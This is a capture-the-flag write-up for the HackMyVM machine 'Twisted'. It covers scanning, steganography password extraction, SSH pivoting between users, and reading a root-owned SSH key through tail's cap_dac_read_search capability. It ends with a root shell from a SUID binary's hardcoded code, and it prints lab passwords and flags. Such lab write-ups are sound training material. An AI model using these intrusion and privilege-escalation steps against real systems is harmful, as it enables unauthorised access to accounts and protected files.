# HackMyVM - Twisted Writeup

> **Platform:** HackMyVM  
> **Machine:** Twisted  
> **OS:** Linux  
> **Difficulty:** *(As per HackMyVM)*

---

# Information Gathering

Unlike many other HackMyVM machines, this challenge does not immediately reveal much information. There is no obvious IP address displayed, so the first step is to identify the target on the network.

## Discovering the Target IP

Using **netdiscover**:

```bash
netdiscover -i eth1
```

Output:

```text
IP               MAC Address         Vendor
--------------------------------------------------------
192.168.56.1
192.168.56.100
192.168.56.140
```

The target machine is:

```
192.168.56.140
```

![Netdiscover](1)

---

# Port Scanning

Perform a full TCP port scan.

```bash
nmap -p- 192.168.56.140
```

Result:

```text
80/tcp    open    http
2222/tcp  open    ssh
```

![Nmap All Ports](2)

---

# Service Enumeration

Now enumerate the discovered services.

```bash
nmap -sC -sV -p80,2222 192.168.56.140
```

Result:

| Port | Service | Version |
|------|---------|---------|
|80|HTTP|nginx 1.14.2|
|2222|SSH|OpenSSH 7.9p1 Debian|

The machine is clearly running Linux.

![Service Scan](3)

---

# Web Enumeration

Browsing to port **80** reveals a very simple webpage.

![Homepage](4)

Viewing the page source reveals something interesting.

```html
<h1>I love cats!</h1>
<img src="cat-original.jpg">

<h1>But I prefer this one because seems different</h1>
<img src="cat-hidden.jpg">
```

Two images immediately stand out:

- cat-original.jpg
- cat-hidden.jpg

These are likely intended as hints.

![Source Code](5)

---

# Steganography

Download the suspicious image.

```bash
wget http://192.168.56.140/cat-hidden.jpg
```

Initially, **binwalk** was used but did not reveal anything useful.

Next, **StegSeek** was used.

```bash
stegseek cat-hidden.jpg
```

Output:

```text
Found passphrase: sexymama

Original filename:
mateo.txt
```

![StegSeek Hidden Image](6)

Extracted file:

```bash
cat cat-hidden.jpg.out
```

```text
thisismypassword
```

At this point we have:

- Username candidate: **mateo**
- Password: **thisismypassword**

---

# Directory Enumeration

Before attempting SSH access, perform a quick directory brute-force.

```bash
feroxbuster -u http://192.168.56.140
```

Nothing particularly interesting is discovered besides the two images.

![Feroxbuster](7)

---

# Initial Access

Attempt SSH login.

```bash
ssh mateo@192.168.56.140 -p 2222
```

Password:

```text
thisismypassword
```

Login successful.

![SSH as mateo](8)

---

# User Enumeration

Inside Mateo's home directory:

```bash
cat note.txt
```

Output:

```text
/var/www/html/gogogo.wav
```

Search for the user flag.

```bash
find / -type f -name user.txt 2>/dev/null
```

Result:

```text
/home/bonita/user.txt
```

At this point we know:

- There is an audio file.
- The user flag belongs to another user (**bonita**).

The audio file was analyzed with **Audacity**, but it did not immediately provide anything useful.

Instead of continuing down that rabbit hole, another look at the original cat image proved much more fruitful.

---

# Another Hidden Secret

Extract data from the second image.

```bash
stegseek cat-original.jpg
```

Output:

```text
Found passphrase:
westlife

Original filename:
markus.txt
```

Extract the contents.

```bash
cat cat-original.jpg.out
```

Output:

```text
markuslovesbonita
```

![StegSeek Original Image](9)

This appears to be another password.

---

# Pivot to Markus

Login as Markus.

```bash
ssh markus@192.168.56.140 -p 2222
```

Password:

```text
markuslovesbonita
```

Reading the note:

```bash
cat note.txt
```

```text
Hi bonita,

I have saved your id_rsa here:

/var/cache/apt/id_rsa

Nobody can find it.
```

Interesting.

The private SSH key for **bonita** is stored inside:

```text
/var/cache/apt/id_rsa
```

However, the file is owned by root.

---

# Local Enumeration

Since sudo is unavailable, begin local privilege escalation enumeration.

Search for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

Interesting result:

```text
/home/bonita/beroot
```

![SUID Binary](10)

Run **LinPEAS** for additional enumeration.

Relevant findings:

```text
Kernel vulnerabilities

CVE-2019-13272

CVE-2021-3493

CVE-2021-22555
```

Also discovered:

```text
-rw------- root root /var/cache/apt/id_rsa
```

Capabilities:

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/ping = cap_net_raw+ep

/usr/bin/tail = cap_dac_read_search+ep
```

---

# Reading Protected Files

The capability on **tail** allows bypassing normal file permissions.

Using GTFOBins:

```bash
tail -c+0 /var/cache/apt/id_rsa
```

The private SSH key can now be read.

Save the key locally.

```bash
chmod 600 id_rsa
```

Login as bonita.

```bash
ssh -i id_rsa bonita@192.168.56.140 -p2222
```

Retrieve the user flag.

```bash
cat user.txt
```

```text
HMVblackcat
```

![User Shell](11)

---

# Privilege Escalation

There is a suspicious SUID binary.

```bash
/home/bonita/beroot
```

Running it:

```text
Enter the code:
```

Supplying random values simply returns:

```text
WRONG
```

---

# Static Analysis

Using **strings**:

```bash
strings beroot
```

Interesting strings appear, but no obvious password.

Next, inspect the binary using **objdump**.

```bash
objdump -d beroot | grep -A 20 "<main>:"
```

Relevant section:

```asm
cmp $0x16f8,%eax
```

The comparison value is:

```
0x16f8
```

Convert hexadecimal to decimal.

```
0x16f8
↓

5880
```

Run the binary again.

```bash
./beroot
```

Input:

```text
5880
```

Root shell obtained.

```text
root@twisted:~#
```

---

# Root Flag

```bash
cat /root/root.txt
```

Output:

```text
HMVwhereismycat
```

![Root Flag](12)

---

# Flags

## User Flag

```text
HMVblackcat
```

## Root Flag

```text
HMVwhereismycat
```

![Flags](13)

---

# Attack Path

```text
Recon
    │
    ▼
Netdiscover
    │
    ▼
Nmap Scan
    │
    ▼
Web Enumeration
    │
    ▼
Hidden Images
    │
    ▼
StegSeek
    │
    ▼
Mateo Credentials
    │
    ▼
SSH (mateo)
    │
    ▼
Discover Markus Password
    │
    ▼
SSH (markus)
    │
    ▼
Find bonita's id_rsa Location
    │
    ▼
Capability Enumeration
    │
    ▼
tail (cap_dac_read_search)
    │
    ▼
Read id_rsa
    │
    ▼
SSH (bonita)
    │
    ▼
Analyze SUID Binary
    │
    ▼
Hex → Decimal (5880)
    │
    ▼
Root Shell
```

---

# Tools Used

- Netdiscover
- Nmap
- Feroxbuster
- StegSeek
- Audacity
- LinPEAS
- GTFOBins
- strings
- objdump
- tail
- SSH

---

# Key Takeaways

- Always inspect seemingly harmless images for hidden content.
- Multiple steganography layers may exist within a machine.
- Linux capabilities can be just as dangerous as SUID binaries.
- GTFOBins is invaluable when uncommon capabilities are discovered.
- Static analysis with `strings` and `objdump` can quickly reveal hardcoded logic inside custom binaries.
- Hexadecimal comparisons in binaries often translate directly into required authentication values.
- Never overlook custom SUID binaries—they frequently hide the intended privilege escalation path.

---

**Machine Compromised Successfully ✔**
